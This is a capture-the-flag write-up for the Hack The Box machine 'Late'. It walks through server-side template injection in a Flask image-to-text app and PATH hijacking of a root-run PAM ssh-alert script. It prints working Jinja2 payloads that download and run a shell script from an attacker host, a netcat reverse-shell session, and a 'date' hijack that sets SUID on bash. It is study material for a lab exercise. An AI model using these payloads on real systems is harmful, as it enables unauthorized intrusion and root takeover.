# Late 
```
Difficulty: Easy
Operating System: Linux
Hints: False
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `svc_acc` | Server-Side Template Injection (SSTI) | Identified a virtual host `images.late.htb` running a Flask application that converts images to text. By creating a custom image containing `{{ 7*7 }}`, a response of `49` confirmed a Jinja2/Twig SSTI vulnerability. Used a command injection payload within the template to download and execute a reverse shell script, gaining a shell as the `svc_acc` user. |
| 2 | `root` | PATH Hijacking & SUID Binary Execution | After gaining a shell, found the `/usr/local/sbin` directory was owned by the `svc_acc` user. A script within this directory, `ssh-alert.sh`, was being executed as `root` upon every SSH login via `pam_exec.so`. The script called several commands, including `date`, without specifying the full path. Created a malicious executable named `date` in `/usr/local/sbin` that granted SUID permissions to `/bin/bash`. Logging in via SSH triggered the root-owned script, which in turn executed the malicious `date` script, setting the SUID bit on bash. Executed `bash -p` to gain a root shell. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.11.156
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see we have only two ports opened 22, 80. Hence, without further doing let's dig into port 80.  
As we open the site we can see a link referring to `images.late.htb`. If we open this virtual host we can see in the site title: `Convert image to textwith Flask`.
Since we already had experience with Flask, from [Doctor](Doctor.md), let's open our notes and see what we have.  
If we go to [book.hacktricks.xyz for flask](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) we can see a really big hint on the top of the page:  
```
Probably if you are playing a CTF a Flask application will be related to STTI
```
Se we can go to [SSTI Page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and read some docs.
As documented there, we can see that the attack is structured in three main phases: Detect, Identify and Exploit.  
So first of all, we need to identify SSTI.  
The application is basically an OCR, so we need to send our payloads in image format.  
to help us with this we can use this [text to image site](https://text2image.com/en/).  
Now, following the [SSTI Page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) procedure, we can send a test payload `{{ 7*7 }}` and analyse the response:  
```
POST /scanner HTTP/1.1
Host: images.late.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------22559853622865390322997987377
Content-Length: 1364
Origin: http://images.late.htb
Connection: close
Referer: http://images.late.htb/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------22559853622865390322997987377
Content-Disposition: form-data; name="file"; filename="tmp6.png"
Content-Type: image/png

PNG


[... SNIP ...]
png data for image containing {{ 7 * 7 }}
-----------------------------22559853622865390322997987377--

```
and in the response we can see:  
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 14 Jul 2022 14:36:29 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Connection: close
Content-Disposition: attachment; filename=results.txt
Last-Modified: Thu, 14 Jul 2022 14:36:29 GMT
Cache-Control: no-cache
ETag: "1657809389.9371333-10-375655978"

<p>49
</p>
```
so we detected that the site is affected by an SSTI vulnerability.  
Once we have detected the template injection potential, the next step is to identify the template engine.
Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. We can follow the tree on [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), here, fuzzing the template engine we can discover what kind of exploit we can run against the application.
```
POST /scanner HTTP/1.1
Host: images.late.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------404991211334584715701059619541
Content-Length: 1639
Origin: http://images.late.htb
Connection: close
Referer: http://images.late.htb/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------404991211334584715701059619541
Content-Disposition: form-data; name="file"; filename="tmp7.png"
Content-Type: image/png

PNG


[... SNIP ...]
png data for image containing {{ 7 * '7' }}
-----------------------------404991211334584715701059619541--
```
And in the response we get: 
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 14 Jul 2022 14:37:44 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 15
Connection: close
Content-Disposition: attachment; filename=results.txt
Last-Modified: Thu, 14 Jul 2022 14:37:44 GMT
Cache-Control: no-cache
ETag: "1657809464.0131314-15-365825568"

<p>7777777
</p>
```
Following the tree and testing all payloads, we can discover that in the back end the application is running Jinja2/twig application.  

## User
Now that we know the templating engine, we can navigate to the exploit section and trigger command execution:  
```python
{{config.__class__.__init__.__globals__["os"].popen("wget http://10.10.14.9/shell.sh > /tmp/shell.sh; chmod 755 shell.sh").read()}}
```
and execute the shell:
```python
{{config.__class__.__init__.__globals__["os"].popen("bash shell.sh").read()}}
```
And we can get a shell as user ```svc_acc```
```
[root@kali Late ]$ bash
root@kali:~/Documents/HTB/Boxes/Late# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.156] 56558
bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
bash-4.4$ id
id
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
```

## Root
Once we log in, we can check for user owned files and we can see the following:  
```
svc_acc@late:~$ find / -user svc_acc 2>/dev/null | grep -v '/run\|/proc\|/sys\|/home\|/var/lib'                                                                                                                                             
/tmp/shell.sh
/usr/local/sbin
/usr/local/sbin/ssh-alert.sh
/dev/pts/0
/dev/pts/1
```
as we can notice `/usr/local/sbin` is owned by `svc_acc`  and also a script `/usr/local/sbin/ssh-alert.sh`. If we open this script we can see the following:  
```bash
svc_acc@late:~/app$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```
As we can assume this script is executed every time we do an ssh login.  
We can use `pspy64`  and trigger an ssh login event (using ssh keys) to confirm this behaviour.  
```bash
2022/07/14 16:08:43 CMD: UID=0    PID=4638   | /bin/bash /usr/local/sbin/ssh-alert.sh
2022/07/14 16:08:43 CMD: UID=0    PID=4640   | /bin/bash /usr/local/sbin/ssh-alert.sh
2022/07/14 16:08:47 CMD: UID=110  PID=4642   | sshd: [net]
2022/07/14 16:08:47 CMD: UID=0    PID=4641   | sshd: [accepted]
2022/07/14 16:08:47 CMD: UID=0    PID=4643   | /bin/bash /usr/local/sbin/ssh-alert.sh
2022/07/14 16:08:47 CMD: UID=0    PID=4644   |
2022/07/14 16:08:47 CMD: UID=0    PID=4645   | /bin/bash /usr/local/sbin/ssh-alert.sh
2022/07/14 16:08:47 CMD: UID=0    PID=4647   | /bin/bash /usr/local/sbin/ssh-alert.sh
2022/07/14 16:08:47 CMD: UID=0    PID=4648   | sendmail: MTA: 26EG8lLc004648 localhost.localdomain [127.0.0.1]: DATA
2022/07/14 16:08:47 CMD: UID=1000 PID=4650   | sshd: svc_acc
2022/07/14 16:08:47 CMD: UID=0    PID=4649   | sendmail: MTA: ./26EG8lLc004648 from queue
2022/07/14 16:08:47 CMD: UID=0    PID=4651   | sensible-mda svc_acc@new root  127.0.0.1
```
as we can see, as we login, the script get executed.  
Now, if we inspect `$PATH` we can see that `/usr/local/sbin` (owned by us in in the path).  
Now, since the script does not contain full path for commands like `date`, we can hijack the path if date is located in a folder with a lower priority than  `/usr/local/sbin` .  
```bash
svc_acc@late:~$ echo $PATH
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
svc_acc@late:~$ which date
/bin/date
```
If root that is triggering the execution of `/usr/local/sbin/ssh-alert.sh` has the same `$PATH`, we can hijack the path and execute commands as root.  
Now we can create a file `date` in `/usr/local/sbin` with the following content:  
```shell
svc_acc@late:/usr/local/sbin$ cat date
chmod 4755 /bin/bash
```
Now if we login as `svc_user` if the path gets hijacked we can run bash with SUID:  
```
[root@kali Late ]$ ssh -l svc_acc -i keys/id_rsa $TARGET
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
-bash-4.4$ bash -p
bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
bash-4.4# id
uid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc)
```
and we owned root

## Forensics
We just wanted to dig a beet deeper on how this script gets executed on ssh login.  
If we change directory to `/etc/` we can grep for `ssh-alert`:  
```
bash-4.4# grep -ri ssh-alert                                                                                          
pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh
```
now if we navigate to `/etc/pam.d/sshd`, we can see at the bottom of the file:  
```
# Execute a custom script
session required pam_exec.so /usr/local/sbin/ssh-alert.sh
```


